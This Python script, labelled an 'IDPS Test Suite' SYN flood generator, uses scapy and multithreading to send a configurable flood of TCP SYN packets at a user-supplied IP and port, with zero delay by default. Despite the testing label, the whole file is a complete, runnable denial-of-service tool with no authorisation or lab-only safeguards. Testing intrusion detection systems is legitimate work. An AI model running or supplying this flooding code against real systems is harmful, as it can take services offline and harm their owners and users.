import threading
import time
from scapy.all import IP, TCP, send
import sys

def syn_spammer(thread_id, ip, port, packets, delay):
    """
    Worker function for each thread to dispatch SYN packets.

    :param thread_id: Unique ID for the thread for logging purposes.
    :param ip: The target IP address.
    :param port: The target TCP port (e.g., 80 for HTTP).
    :param packets: Number of packets this thread will send.
    :param delay: Time in seconds to wait between packets (0 for max speed).
    :return: None
    """
    print(f"[Thread {thread_id}] Started injection...")

    for _ in range(packets):
        # Craft a TCP SYN packet (flags="S")
        pkt = IP(dst=ip) / TCP(dport=port, flags="S")
        
        # Send the packet without console output
        send(pkt, verbose=False)

        if delay > 0:
            time.sleep(delay)

    print(f"[Thread {thread_id}] Task completed.")

def run_syn_flood(ip, port, threads, packets, delay):
    """
    Orchestrates the SYN Flood simulation using multithreading.

    :param ip: Target destination IP.
    :param port: Target destination port.
    :param threads: Total number of concurrent threads.
    :param packets: Packets to send per thread.
    :param delay: Inter-packet delay for rate control.
    :return: None
    """
    print(f"\nInitiating SYN Flood Test...")
    print(f"Target: {ip}:{port}")
    print(f"Configurations: {threads} threads x {packets} packets (Delay: {delay}s)\n")

    thread_list = []

    for thread_num in range(threads):
        current_thread = threading.Thread(target=syn_spammer, args=(thread_num + 1, ip, port, packets, delay))
        current_thread.start()
        thread_list.append(current_thread)

    # Wait for all threads to finish their workload
    for current_thread in thread_list:
        current_thread.join()

    print("\nSYN Flood Executed.")

def get_int(prompt, default, minimum=1):
    """
    Prompts the user for an integer input, validates it, and ensures it meets a minimum threshold.

    :param prompt: The text message to display to the user.
    :param default: The integer value to return if the user provides empty input.
    :param minimum: The lowest allowable integer value (default is 1).
    :return: A validated integer meeting the minimum requirement.
    """
    while True:
        try:
            val = input(f"{prompt} (default {default}): ").strip()
            if not val: 
                return default
            
            res = int(val)
            if res >= minimum: 
                return res
            
            print(f"Value must be >= {minimum}")
        except ValueError:
            print("Please enter a valid number.")

def get_float(prompt, default, minimum=0.0):
    """
    Prompts the user for a floating-point input, validates it, and ensures it meets a minimum threshold.

    :param prompt: The text message to display to the user.
    :param default: The float value to return if the user provides empty input.
    :param minimum: The lowest allowable float value (default is 0.0).
    :return: A validated float meeting the minimum requirement.
    """
    while True:
        try:
            val = input(f"{prompt} (default {default}): ").strip()
            if not val: 
                return default
            
            res = float(val)
            if res >= minimum: 
                return res
            
            print(f"Value must be >= {minimum}")
        except ValueError:
            print("Please enter a valid number.")

def main():
    """
    Main entry point for the SYN Flood tester.
    """
    print("IDPS Test Suite: SYN Flood Generator")
    try:
        target_ip = input("Target IP [192.168.1.1]: ").strip() or "192.168.1.1"
        target_port = get_int("Target Port", default=80)
        num_threads = get_int("Threads", default=10)
        num_packets = get_int("Packets per thread", default=100)
        delay_val = get_float("Delay between packets", default=0.0)

        run_syn_flood(target_ip, target_port, num_threads, num_packets, delay_val)

    except KeyboardInterrupt:
        print("\n[!] Aborted by user.")
        sys.exit(0)

if __name__ == "__main__":
    main()